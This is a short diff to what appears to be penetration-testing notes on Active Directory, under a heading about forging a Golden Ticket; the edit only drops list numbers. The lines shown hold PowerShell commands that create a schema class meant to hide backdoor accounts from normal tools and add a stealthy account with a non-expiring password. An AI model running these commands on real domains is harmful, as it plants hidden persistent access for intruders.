@@ -74,11 +74,11 @@ Forge a `Golden Ticket`:
     - can modify active directory schema: new attributes and object classes
 
 #### Create backdoor user
-1. Create a new object class for backdoor accounts that normal tools won't recognize as users:
+Create a new object class for backdoor accounts that normal tools won't recognize as users:
 
     New-ADObject -Name "StealthyUserClass" -Type classSchema -Path "CN=Schema,CN=Configuration,DC=example,DC=com"
 
-2. Ass a new user account with this class
+Ass a new user account with this class
 
     New-ADObject -Name "pentest_backdoor" -Type StealthyUserClass -Path "CN=Users,DC=example,DC=com"
     Set-ADUser -Identity "pentest_backdoor" -PasswordNeverExpires $true -CannotChangePassword $true
